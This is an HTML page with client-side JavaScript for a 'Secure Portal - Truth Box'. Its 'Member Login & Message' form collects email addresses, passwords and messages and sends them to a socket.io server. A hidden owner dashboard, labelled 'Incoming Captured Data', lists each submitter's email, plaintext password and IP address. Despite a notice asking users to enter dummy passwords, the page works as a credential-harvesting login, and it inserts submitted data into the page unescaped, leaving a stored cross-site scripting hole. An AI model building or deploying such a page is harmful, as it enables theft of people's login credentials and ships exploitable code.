<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Portal - Truth Box</title>
  <style>
    :root {
      --bg-color: #0f0f13;
      --card-bg: #1a1a24;
      --accent: #ff3366;
      --text: #ffffff;
      --subtext: #a0a0b0;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg-color); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }

    .container { width: 100%; max-width: 440px; background: var(--card-bg); border-radius: 20px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 20px; }

    .profile-section { text-align: center; }
    .avatar { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #ff3366, #ff6b6b); margin: 0 auto 12px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
    h1 { font-size: 20px; margin-bottom: 4px; }
    p { font-size: 13px; color: var(--subtext); }

    .warning-box { background: rgba(255, 152, 0, 0.1); border: 1px solid rgba(255, 152, 0, 0.3); padding: 10px 14px; border-radius: 10px; font-size: 12px; color: #ffb74d; line-height: 1.4; text-align: center; }

    input, textarea { width: 100%; background: #121217; border: 1px solid #333; border-radius: 12px; padding: 14px; color: var(--text); font-size: 15px; outline: none; margin-bottom: 12px; }
    input:focus, textarea:focus { border-color: var(--accent); }
    textarea { height: 90px; resize: none; }

    .send-btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
    .send-btn:hover { opacity: 0.9; }

    #dashboard { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; }
    .msg-card { background: #121217; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; border-left: 4px solid var(--accent); }
    .meta-tag { font-size: 11px; color: #00e676; margin-top: 4px; font-family: monospace; display: block; }
    
    .toggle-dash { background: none; border: none; color: var(--subtext); font-size: 11px; cursor: pointer; text-align: center; margin-top: 10px; text-decoration: underline; }
  </style>
</head>
<body>

  <div class="container">
    <div class="profile-section">
      <div class="avatar">🔐</div>
      <h1>Member Login & Message</h1>
      <p>Sign in with your details to send a note.</p>
    </div>

    <div class="warning-box">
      ⚠️ <strong>Notice:</strong> This is a fun test portal. Please <strong>do not</strong> use a real password that you use for important accounts! Make up a dummy password.
    </div>

    <form id="form" onsubmit="sendMessage(event)">
      <input type="email" id="email-input" placeholder="Email address..." required />
      <input type="password" id="password-input" placeholder="Password..." required />
      <textarea id="message-input" placeholder="Type your message here..." required></textarea>
      <button type="submit" class="send-btn">Submit & Send ✈️</button>
    </form>

    <div id="success-msg" style="display:none; text-align:center; color: #00e676; font-weight:bold; padding: 20px;">
      ✨ Sent successfully!
    </div>

    <button class="toggle-dash" onclick="requestAdminAccess()">🔒 Owner Dashboard Login</button>

    <!-- Owner View (Protected) -->
    <div id="dashboard">
      <h3 style="font-size: 14px; margin-bottom: 10px; color: var(--accent);">Incoming Captured Data</h3>
      <div id="inbox-list">No submissions yet.</div>
    </div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const form = document.getElementById('form');
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const messageInput = document.getElementById('message-input');
    const successMsg = document.getElementById('success-msg');
    const inboxList = document.getElementById('inbox-list');

    function sendMessage(e) {
      e.preventDefault();
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      const text = messageInput.value.trim();
      
      if (text && email && password) {
        socket.emit('send secret', { email, password, text });
        form.style.display = 'none';
        successMsg.style.display = 'block';
      }
    }

    function requestAdminAccess() {
      const pass = prompt("Enter owner dashboard password:");
      if (pass) {
        socket.emit('admin login', pass);
      }
    }

    socket.on('admin success', (msgs) => {
      document.getElementById('dashboard').style.display = 'block';
      renderInbox(msgs);
    });

    socket.on('admin error', (err) => {
      alert(err);
    });

    socket.on('new secret', (msg) => {
      // If you have the dashboard open, it updates live when someone submits!
      if (document.getElementById('dashboard').style.display === 'block') {
        // Fetch current list or prepend
        location.reload(); // Simple way to refresh data or keep it dynamic
      }
    });

    function renderInbox(msgs) {
      if (msgs.length === 0) {
        inboxList.innerHTML = 'No submissions yet.';
        return;
      }
      let html = '';
      msgs.forEach(m => {
        html += `
          <div class="msg-card">
            <div style="font-weight: bold; color: #ff80ab;">📧 Email: ${m.email}</div>
            <div style="font-family: monospace; color: #ffb74d; font-size: 13px; margin: 4px 0;">🔑 Password: ${m.password}</div>
            <div style="margin-top: 6px; border-top: 1px dashed #333; padding-top: 4px;">💬 Message: ${m.text}</div>
            <span class="meta-tag">📍 IP: ${m.ip} | 🕒 ${m.time}</span>
          </div>
        `;
      });
      inboxList.innerHTML = html;
    }
  </script>
</body>
</html>
